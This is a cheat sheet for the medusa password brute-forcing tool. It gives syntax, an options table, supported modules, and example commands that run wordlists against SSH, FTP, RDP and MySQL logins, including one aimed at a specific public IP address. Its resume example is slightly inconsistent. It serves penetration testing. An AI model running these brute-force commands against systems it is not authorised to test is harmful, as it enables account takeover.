
https://www.kali.org/tools/medusa/

---

`medusa` is a **command-line tool** used for **brute-force attacks** against remote authentication services. 

It's often to test for **weak passwords** across various protocols like `SSH`, `FTP`, `RDP`, `HTTP`, `MySQL`, `SMB`, etc.


**Basic Syntax**
```bash
medusa -h <target> -u <username> -P <password_file> -M <module>
```

**You can list all modules supported by your `medusa` installation with:**
```bash
medusa -d
```

| Option     | Meaning |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-h`       | Target IP or hostname                                                                                                                                                                           |
| `-u`       | Username (single)                                                                                                                                                                               |
| `-U`       | Username list file                                                                                                                                                                              |
| `-p`       | Password (single)                                                                                                                                                                               |
| `-P`       | Password list file                                                                                                                                                                              |
| `-M`       | Module (protocol/service)                                                                                                                                                                       |
| `-n`       | Port number (if not default)                                                                                                                                                                    |
| `-t`       | Number of concurrent threads                                                                                                                                                                    |
| `-e`       | Additional checks (like blank passwords)                                                                                                                                                        |
| `-f`       | Stop scanning the current host after the first valid username/password is found.<br><br>Effect: Medusa moves on to the next host in the target list.                                            |
| `-F`       | Stop the entire audit after the first valid username/password is found on any host.<br><br>Effect: Medusa quits completely once one success is discovered, even if other hosts remain untested. |
| `-r [NUM]` | Sleep `NUM` seconds between retry attempts (default 3)                                                                                                                                          |
| `-R [NUM]` | Attempt `NUM` retries before giving up. The total number of attempts will be `NUM + 1`                                                                                                          |

* * *

# Common Usage Examples

**`SSH` Brute-force (single user)**
```bash
medusa -h 192.168.1.10 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```

**`FTP` Brute-force (multiple users)**
```bash
medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ftp
```

**`RDP` Brute-force**
```bash
medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M rdp
```

**`MySQL` Brute-force**
```bash
medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M mysql
```

---

# Cumulative attack

The `-Z [TEXT]` option in Medusa is for resuming a scan from where a previous one left off.

```sh
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -o mapfile.txt
```
This starts a scan and saves a map of progress in `mapfile.txt`.

```sh
medusa -Z ${medus_last_running_output}
```

* * *

# ⚠️ Notes & Tips

* Use `-f` to **stop after the first successful login**, useful in testing.
* Use `-t 5` or higher for **multi-threading**, but avoid overloading the host.
* Use `-n` to specify a **non-default port**.
* You can combine `-u`, `-U`, `-p`, and `-P` in creative ways, depending on your use case.

* * *

# Authentication Modules Supported by Medusa

| Module       | Description                              |
| ------------ | ---------------------------------------- |
| `afp`        | Apple Filing Protocol (Apple File Share) |
| `cvs`        | Concurrent Versions System               |
| `ftp`        | File Transfer Protocol                   |
| `http`       | HTTP basic authentication                |
| `http-proxy` | HTTP proxy authentication                |
| `icq`        | ICQ Instant Messaging                    |
| `imap`       | Internet Message Access Protocol         |
| `mssql`      | Microsoft SQL Server                     |
| `mysql`      | MySQL Database                           |
| `ncp`        | Novell Core Protocol                     |
| `nntp`       | Network News Transfer Protocol           |
| `pcanywhere` | Symantec pcAnywhere                      |
| `pop3`       | Post Office Protocol (v3)                |
| `postgres`   | PostgreSQL Database                      |
| `rdp`        | Remote Desktop Protocol                  |
| `rexec`      | Remote execution (RExec)                 |
| `rlogin`     | Remote Login                             |
| `rsh`        | Remote Shell                             |
| `smbnt`      | SMB (NetBIOS) for Windows shares         |
| `smtp`       | Simple Mail Transfer Protocol            |
| `snmp`       | SNMP v1 & v2c (read community strings)   |
| `ssh`        | Secure Shell                             |
| `svn`        | Subversion                               |
| `telnet`     | Telnet Protocol                          |
| `vmauthd`    | VMware Authentication Daemon             |
| `vnc`        | Virtual Network Computing                |


---
# Example

```sh
sudo medusa -h 38.76.31.136 -U /usr/share/wordlists/SecLists/Usernames/mssql-usernames-nansh0u-guardicore.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt -M mysql -F -O medusa_mapfile.txt -r 30 -R 7
```


